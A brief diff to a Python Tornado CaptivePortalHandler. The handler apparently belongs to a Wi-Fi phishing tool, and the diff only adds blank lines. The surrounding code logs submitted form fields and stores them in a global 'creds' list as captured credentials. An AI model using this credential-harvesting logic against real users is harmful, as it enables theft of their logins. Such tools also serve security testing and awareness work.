@@ -64,8 +64,10 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                                "\n")
                 log_file.close()
         global terminate, creds
+
         for input_name,input_value in form_values:
             creds.insert(0, repr(input_name + " = " + input_value))
+
         terminate = True
 
         
